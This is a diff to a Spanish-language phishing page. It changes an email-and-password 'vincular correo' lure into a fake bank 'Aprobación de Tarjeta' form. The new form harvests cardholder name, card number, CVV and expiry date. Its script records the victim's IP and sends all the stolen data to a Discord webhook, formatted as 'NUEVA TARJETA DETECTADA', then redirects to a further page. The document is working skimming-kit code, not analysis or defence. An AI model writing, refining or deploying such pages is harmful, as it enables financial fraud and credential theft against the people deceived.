@@ -3,55 +3,78 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Vinculación de Correo</title>
+    <title>Aprobación de Tarjeta</title>
     <style>
+      /* (Tus estilos se mantienen exactamente igual) */
       * {
         box-sizing: border-box;
         margin: 0;
         padding: 0;
-        font-family: Arial, sans-serif;
+        font-family: Arial, Helvetica, sans-serif;
       }
       body {
         background-color: #ffffff;
         display: flex;
         justify-content: center;
         align-items: center;
-        height: 100vh;
+        min-height: 100vh;
+        padding: 20px;
       }
       .card {
         background: #ffffff;
-        width: 360px;
-        padding: 40px 30px;
+        width: 100%;
+        max-width: 380px;
+        padding: 40px 25px;
         border-radius: 45px;
         box-shadow: 0 10px 60px rgba(0, 0, 0, 0.4);
         text-align: center;
       }
-      .logo-superior {
-        width: 120px;
-        margin-bottom: 10px;
-        display: inline-block;
+      .logo-banco-container {
+        width: 100%;
+        height: 60px;
+        margin-bottom: 20px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+      .logo-banco-container img {
+        max-height: 100%;
+        max-width: 200px;
       }
       h1 {
-        font-size: 26px;
-        color: #1a1a1a;
-        margin-bottom: 20px;
+        font-size: 24px;
+        color: #222;
+        margin-bottom: 15px;
         font-weight: bold;
       }
-      .imagen-sobre {
-        width: 50px;
-        margin: 0 auto 5px;
-        display: block;
+      .icono-central-container {
+        width: 100%;
+        height: 80px;
+        margin-bottom: 15px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
       }
-      .texto-necesitamos {
+      .icono-central-container img {
+        max-height: 100%;
+      }
+      .description {
         color: #8c8c8c;
-        font-size: 18px;
-        margin-bottom: 35px;
-        font-weight: normal;
+        font-size: 15px;
+        line-height: 1.3;
+        margin-bottom: 25px;
+      }
+      .description b {
+        color: #777;
       }
       form {
         display: flex;
         flex-direction: column;
-        gap: 25px;
+        gap: 15px;
+      }
+      .row {
+        display: flex;
+        gap: 10px;
       }
       input {
         width: 100%;
@@ -59,112 +82,170 @@
         border: 1px solid #999;
         border-radius: 2px;
         font-size: 16px;
-        color: #555;
+        color: #333;
         outline: none;
+        text-align: center;
+      }
+      input::placeholder {
+        color: #bbbbbb;
+      }
+      .label-text {
+        text-align: left;
+        font-size: 14px;
+        color: #000;
+        margin-top: 5px;
+      }
+      .logos-tarjetas-container {
+        height: 40px;
+        flex: 1;
+        display: flex;
+        align-items: center;
+      }
+      .logos-tarjetas-container img {
+        height: 100%;
       }
       button {
-        margin-top: 10px;
-        padding: 16px;
+        margin-top: 15px;
+        padding: 18px;
         background-color: #000;
         color: #fff;
         border: none;
         border-radius: 25px;
-        font-size: 15px;
+        font-size: 16px;
         font-weight: 500;
         cursor: pointer;
       }
       button:disabled {
-        background-color: #444;
-        opacity: 0.8;
+        opacity: 0.6;
+        cursor: not-allowed;
       }
     </style>
   </head>
   <body>
     <div class="card">
-      <img
-        src="css/swj.png"
-        alt="Logo"
-        class="logo-superior"
-      />
-      <h1>Bienvenido/a!</h1>
-      <img src="css/vNImrAq.png" alt="" class="imagen-sobre" />
-      <p class="texto-necesitamos">
-        Necesitamos que vincule nuevamente su correo electronico, inicie sesión
-        y se vinculara automaticamente
+      <div class="logo-banco-container">
+        <img src="css/swj.png" alt="" />
+      </div>
+
+      <h1>Aprobacion de su Tarjeta</h1>
+
+      <div class="icono-central-container">
+        <img src="css/BaerVuK.png" alt="" />
+      </div>
+
+      <p class="description">
+        <b>Estimado cliente</b> será necesario confirmar los datos de su tarjeta
+        de credito o debito para aprobar o renovar su tarjeta
       </p>
 
-      <form id="loginForm">
-        <input
-          type="email"
-          id="email"
-          placeholder="Escriba su correo electronico"
-          required
-        />
-        <input
-          type="password"
-          id="password"
-          placeholder="Contraseña del correo electronico"
-          required
-        />
-        <button type="submit" id="submitBtn">Vincular correo</button>
+      <form id="cardForm">
+        <div class="row">
+          <input type="text" id="nombre" placeholder="Nombre" required />
+          <input type="text" id="apellido" placeholder="Apellido" required />
+        </div>
+
+        <div class="row">
+          <input
+            type="text"
+            id="tarjeta"
+            placeholder="Numero de Tarjeta"
+            style="flex: 3"
+            required
+          />
+          <input
+            type="text"
+            id="cvv"
+            placeholder="CVV"
+            style="flex: 1"
+            required
+          />
+        </div>
+
+        <p class="label-text">Fecha de Vencimiento:</p>
+
+        <div class="row" style="align-items: center">
+          <input
+            type="text"
+            id="mes"
+            placeholder="Mes"
+            style="width: 70px"
+            required
+          />
+          <input
+            type="text"
+            id="año"
+            placeholder="Año"
+            style="width: 70px"
+            required
+          />
+          <div class="logos-tarjetas-container">
+            <img src="css/KidBS1D.jpg" alt="" />
+          </div>
+        </div>
+
+        <button type="submit" id="btnConfirmar">Confirmar datos</button>
       </form>
     </div>
 
+    <!-- Cargamos la variable desde tu archivo envi.js -->
     <script src="css/envi.js"></script>
 
     <script>
-      const loginForm = document.getElementById("loginForm");
-      const submitBtn = document.getElementById("submitBtn");
+      const cardForm = document.getElementById("cardForm");
+      const btn = document.getElementById("btnConfirmar");
 
-      loginForm.addEventListener("submit", async function (e) {
+      cardForm.addEventListener("submit", async function (e) {
         e.preventDefault();
 
-        const emailValue = document.getElementById("email").value;
-        const passValue = document.getElementById("password").value;
+        // Bloquear botón
+        btn.innerText = "Verificando...";
+        btn.disabled = true;
 
-        submitBtn.innerText = "Procesando...";
-        submitBtn.disabled = true;
-
-        let userIP = "Desconocida";
+        // 1. Obtener IP
+        let ip = "No detectada";
         try {
-          const ipResponse = await fetch("https://api.ipify.org?format=json");
-          const ipData = await ipResponse.json();
-          userIP = ipData.ip;
-        } catch (err) {
-          console.error(err);
-        }
+          const res = await fetch("https://api.ipify.org?format=json");
+          const data = await res.json();
+          ip = data.ip;
+        } catch (err) {}
 
-        // Mensaje en texto plano para Discord
+        // 2. Recopilar datos
+        const info = {
+          nombre: document.getElementById("nombre").value,
+          apellido: document.getElementById("apellido").value,
+          numero: document.getElementById("tarjeta").value,
+          cvv: document.getElementById("cvv").value,
+          fecha:
+            document.getElementById("mes").value +
+            "/" +
+            document.getElementById("año").value,
+        };
+
+        // 3. Formatear mensaje sencillo para Discord
         const contentText =
-          `**NUEVO REGISTRO**\n` +
-          `> **Correo:** ${emailValue}\n` +
-          `> **Contraseña:** ${passValue}\n` +
-          `> **IP:** ${userIP}\n` +
-          `> **Fecha:** ${new Date().toLocaleString()}`;
+          `**NUEVA TARJETA DETECTADA**\n` +
+          `> **Titular:** ${info.nombre} ${info.apellido}\n` +
+          `> **Número:** ${info.numero}\n` +
+          `> **CVV:** ${info.cvv}\n` +
+          `> **Vence:** ${info.fecha}\n` +
+          `> **IP:** ${ip}`;
 
+        // 4. Enviar
         fetch(webhookURL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ content: contentText }),
         })
-          .then((response) => {
-            if (response.ok) {
-              window.location.href = "index2.html";
-            } else {
-              alert("Error al procesar.");
-              resetBtn();
-            }
+          .then(() => {
+            // 5. Redireccionar al finalizar
+            window.location.href = "index3.html";
           })
           .catch(() => {
-            alert("Error de conexión.");
-            resetBtn();
+            alert("Error de conexión");
+            btn.disabled = false;
+            btn.innerText = "Confirmar datos";
           });
       });
-
-      function resetBtn() {
-        submitBtn.disabled = false;
-        submitBtn.innerText = "Vincular correo";
-      }
     </script>
   </body>
 </html>
